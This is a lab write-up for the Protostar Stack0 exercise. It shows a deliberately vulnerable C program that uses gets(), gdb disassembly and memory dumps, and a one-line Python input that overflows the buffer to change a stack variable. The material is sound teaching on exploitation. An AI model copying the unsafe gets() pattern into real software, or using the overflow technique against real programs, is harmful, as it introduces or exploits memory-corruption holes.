# PROTOSTAR : STACK 0 
[Protostar:Stack0](https://exploit.education/protostar/stack-zero/)

In this challenge we are going to learn Stack Buffer Overflow exploitation Attack. I am going to be using kali linux and gdb debugger for the rest of the challenges.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

In the above code the *gets()* function is vulnerable to Buffer Overflow attacks since *gets()* takes user input but we cannot determine how many characters are actually passed so the characters beyond 64 here will overflow and affect the adjacent memory addresses changing their values.

### **SOLUTION**

Below is the disassembly of the **main()**
```
user@protostar:/opt/protostar/bin$ gdb -q stack0
Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave  
0x08048434 <main+64>:   ret    
End of assembler dump.
(gdb) 
```
If you notice properly at **0x08048415** there is a condition which does bitwise AND operation on eax register. If eax = 0 then the eip register(instruction pointer) jumps to **0x08048427** and prints **"Try again?\n"**.
To prevent that we need to change value of **modified** variable.
<br>
<br>
Passing input and analyzing the program.
```
(gdb) b *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
13      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) x/20x $esp
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
0xbffff760:     0x41414141      0x41414141      0xbfff0041      0x080482e8
0xbffff770:     0xb7ff1040      0x08049620      0xbffff7a8      0x08048469
0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7a8
(gdb) c
Continuing.
Try again?

Program exited with code 013.
(gdb) 
```

I think you have noticed that at **0xbffff760** there are **0x41**,
this is because is hexadecimal "A" is denoted as 41 and also the
address shows us the start of our **buffer** variable.
<br>
<br>
Let's pass more than 64 characters and analyze the program again...
```
(gdb) r
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) x/20x $esp
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
(gdb) 
```
Great the stack has overflown with **0x41** and the modified variable
value has changed.<br>

### Python script to solve the challenge

```
user@protostar:/opt/protostar/bin$ (python -c "print 'A'*65") | ./stack0
you have changed the 'modified' variable
user@protostar:/opt/protostar/bin$ 
```
